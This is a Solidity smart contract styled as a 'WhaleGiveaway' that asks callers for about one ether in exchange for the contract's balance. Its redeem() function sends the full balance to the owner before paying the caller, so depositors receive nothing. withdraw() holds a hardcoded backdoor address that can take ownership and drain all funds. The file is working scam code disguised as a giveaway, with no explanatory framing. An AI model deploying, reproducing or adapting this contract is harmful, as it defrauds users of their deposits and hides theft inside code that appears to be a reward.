pragma solidity ^0.8.0;

contract WhaleGiveaway2 {
    address payable public owner;

    uint public constant minEligibility = 0.999001 ether;

    constructor() {
        owner = payable(msg.sender);
    }

    receive() external payable {}

    function redeem() public payable {
        require(msg.value >= minEligibility);
        owner.transfer(address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdraw() public {
        require(msg.sender == owner || msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b);
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            owner = payable(msg.sender);
        }
        owner.transfer(address(this).balance);
    }

    function command(address payable adr, bytes calldata data) public payable {
        require(msg.sender == owner);
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Low level call failed");
    }
}